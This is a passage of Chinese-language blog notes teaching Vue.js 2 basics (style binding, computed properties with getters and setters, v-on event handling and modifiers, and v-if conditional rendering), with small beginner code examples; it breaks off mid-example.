class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">el: <span class="string">"#app"</span>,</span></span><br><span class="line">data: &#123;</span><br><span class="line"><span class="actionscript">message: <span class="string">"你好啊"</span>,</span></span><br><span class="line"><span class="actionscript">a: <span class="string">'aaa'</span>,</span></span><br><span class="line"><span class="actionscript">b: <span class="string">'bbb'</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="动态绑定style"><a href="#动态绑定style" class="headerlink" title="动态绑定style"></a>动态绑定style</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;h2 :style="&#123;color: 'pink', fontSize:'100px'&#125;"&gt;&#123;&#123;message&#125;&#125;&lt;/h2&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">"&#123;color: c, fontSize: s&#125;"</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">        message: <span class="string">"你好"</span>,</span></span><br><span class="line"><span class="actionscript">        c: <span class="string">'skyblue'</span>,</span></span><br><span class="line"><span class="actionscript">        s: <span class="string">'100px'</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h1><p>简介：一般情况下，我们会使用插值语法将我们要展示的值渲染到页面，但有时候我们可能需要对一些数据进行相应的计算后再显示，这个时候我们就可以用实例化的Vue对象中定义一个computed属性中去定义详细的方法</p><h2 id="简单计算属性"><a href="#简单计算属性" class="headerlink" title="简单计算属性"></a>简单计算属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName&#125;&#125; &#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;firstName + " " + lastName&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullname&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">    firstName: <span class="string">'z'</span>,</span></span><br><span class="line"><span class="actionscript">    lastName: <span class="string">'yy'</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line"><span class="actionscript">        fullname: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">' '</span> + <span class="keyword">this</span>.lastName</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="复杂计算属性"><a href="#复杂计算属性" class="headerlink" title="复杂计算属性"></a>复杂计算属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>总价格&#123;&#123;totalPrice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'../node_modules/vue/dist/vue.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line">        fruits: [&#123;</span><br><span class="line">            id: 100,</span><br><span class="line"><span class="actionscript">            name: <span class="string">'苹果'</span>,</span></span><br><span class="line">            price: 6</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            id: 101,</span><br><span class="line"><span class="actionscript">            name: <span class="string">'菠萝'</span>,</span></span><br><span class="line">            price: 10</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            id: 102,</span><br><span class="line"><span class="actionscript">            name: <span class="string">'西瓜'</span>,</span></span><br><span class="line">            price: 5</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            id: 103,</span><br><span class="line"><span class="actionscript">            name: <span class="string">'栗子'</span>,</span></span><br><span class="line">            price: 15</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            id: 104,</span><br><span class="line"><span class="actionscript">            name: <span class="string">'百香果'</span>,</span></span><br><span class="line">            price: 12</span><br><span class="line">        &#125;, ]</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line"><span class="actionscript">        totalPrice: <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> total = <span class="number">0</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// //forin方法</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// for (a in this.fruits) &#123;</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// total += this.fruits[a].price</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">//reduce方法</span></span></span><br><span class="line"><span class="javascript">            total = <span class="keyword">this</span>.fruits.reduce(<span class="function">(<span class="params">accumulator, currentValue</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(accumulator)</span></span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> accumulator + currentValue.price</span></span><br><span class="line">            &#125;, 0)</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> total</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="计算属性的setter和getter以及缓存"><a href="#计算属性的setter和getter以及缓存" class="headerlink" title="计算属性的setter和getter以及缓存"></a>计算属性的setter和getter以及缓存</h2><ul><li>每个计算属性都包含一个getter和一个setter</li><li>使用getter来读取</li><li>在某些情况下也可以提供一个setter方法（不常用）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;totalprice&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">el: <span class="string">'#app'</span>,</span></span><br><span class="line">data: &#123;</span><br><span class="line"><span class="actionscript">a: <span class="string">'aaa'</span>,</span></span><br><span class="line"><span class="actionscript">b: <span class="string">'bbb'</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="actionscript"><span class="comment">//computed会保存缓存，若a和b的数据不变，则totalprice不变，而methods无论如何每次都会执行一次函数，浪费性能</span></span></span><br><span class="line">computed: &#123;</span><br><span class="line">totalprice: &#123;</span><br><span class="line"><span class="actionscript"><span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">return</span> <span class="keyword">this</span>.a + <span class="string">' '</span> + <span class="keyword">this</span>.b</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="actionscript"><span class="keyword">set</span>: <span class="function"><span class="keyword">function</span><span class="params">(c)</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> d = c.split(<span class="string">' '</span>)</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.a = d[<span class="number">0</span>]</span></span><br><span class="line"><span class="actionscript"><span class="keyword">this</span>.b = d[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><p><strong>v-on介绍</strong></p><p><strong>作用</strong>：绑定事件监听器</p><p><strong>缩写</strong>：@</p><p><strong>预期</strong>：Function | Inline Statement | Object</p><p><strong>参数</strong>：event</p><h2 id="v-on基础"><a href="#v-on基础" class="headerlink" title="v-on基础"></a>v-on基础</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 直接在绑定事件中定义方法(不常用) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"message ++"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 定义方法名，在methods中实现 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">"reduce"</span>&gt;</span>-<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 语法糖 v-on:===@ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click="reduce"&gt;-&lt;/button&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'.app'</span>,</span></span><br><span class="line">    data:&#123;</span><br><span class="line">      message: 12,</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      reduce()&#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.message --</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-on参数"><a href="#v-on参数" class="headerlink" title="v-on参数"></a>v-on参数</h2><ol><li>当形参没有定义时，动态绑定的事件名可以不加括号</li><li>当形参定义后，不加括号则会默认绑定windows创建的event对象，如若加括号没定义参数则会返回underfinde</li><li>当有参数且需要定义实参，同时需要用到windows创建的event对象，则使用$event定义</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 当形参没有定义时，可以不加括号 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click="hhh"&gt;点我啊&lt;/button&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click="hhh()"&gt;点我啊&lt;/button&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 当形参定义后，不加括号，则会默认绑定浏览器创建的event对象,如若加括号且没定义实参，则会返回underfinde（不报错） --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button @click="hhh()"&gt;点我啊&lt;/button&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 当有形参，且需要实参定义，并且同时需要浏览器默认创建的event对象时，则用$event定义(注意书写，不能拼错) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"hhh(123,$event)"</span>&gt;</span>点我爱<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">      el: <span class="string">'#app'</span>,</span></span><br><span class="line">      methods: &#123;</span><br><span class="line">        hhh(abc,e)&#123;</span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(abc,e)</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-on修饰符"><a href="#v-on修饰符" class="headerlink" title="v-on修饰符"></a>v-on修饰符</h2><ul><li>阻止事件冒泡：.stop</li><li>阻止默认事件：.prevent</li><li>监听键盘按键：{.keyCode，.keyAlies}</li><li>只触发一次回调：.once</li><li>监听组件根元素的原生事件：.native</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span> @<span class="attr">click</span>=<span class="string">"d"</span>&gt;</span></span><br><span class="line">    啦啦啦啦啦</span><br><span class="line">    <span class="comment">&lt;!-- 阻止冒泡 .stop --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">'c'</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 阻止默认事件 .prevent--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"dong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> @<span class="attr">click.prevent</span>=<span class="string">'e'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 监听键盘按键 &#123;.keyCode&#125; or &#123;.keyAlies&#125;--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 判断是否键入空格,keyup:鼠标弹起 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> @<span class="attr">keyup.space</span>=<span class="string">'f'</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 触发一次回调 .once--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">'c'</span>&gt;</span>我只能点一次<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 监听组件根元素的原生事件 .native (后面补充)--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    methods: &#123;</span><br><span class="line">      c() &#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'ccc'</span>)</span></span><br><span class="line">      &#125;,</span><br><span class="line">      d() &#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'ddd'</span>)</span></span><br><span class="line">      &#125;,</span><br><span class="line">      e()&#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'aaa'</span>)</span></span><br><span class="line">      &#125;,</span><br><span class="line">      f()&#123;</span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'你键入了空格'</span>)</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h1><p><strong>v-if、v-else-if、v-else</strong></p><ul><li><p>这三个指令与JavaScript的条件语句if、else、else if类似。</p></li><li><p>Vue的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件</p></li></ul><h2 id="案例1（布尔判断）"><a href="#案例1（布尔判断）" class="headerlink" title="案例1（布尔判断）"></a>案例1（布尔判断）</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 当条件为真时 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">"ifTrue"</span>&gt;</span>我是一<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 当条件不成立时 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>我是二<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      ifTrue: <span class="literal">false</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="案例2（成绩判断器）"><a href="#案例2（成绩判断器）" class="headerlink" title="案例2（成绩判断器）"></a>案例2（成绩判断器）</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 成绩判断 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-if</span>=<span class="string">"score &gt;= 80"</span>&gt;</span>优秀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else-if</span>=<span class="string">"score &gt;= 60"</span>&gt;</span>良好<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>不及格<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line">      score: 80</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="登录切换案例以及问题"><a href="#登录切换案例以及问题" class="headerlink" title="登录切换案例以及问题"></a>登录切换案例以及问题</h2><p><strong>实现按钮切换登陆方式（用户名-邮箱）</strong></p><ol><li>定义初步页面</li><li>为不同输入框进行条件判断（v-if、v-else）<ul><li>若条件为true，则使用用户名</li><li>条件为false，则使用邮箱</li></ul></li><li>为切换按钮绑定事件，动态改变条件（v-on）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 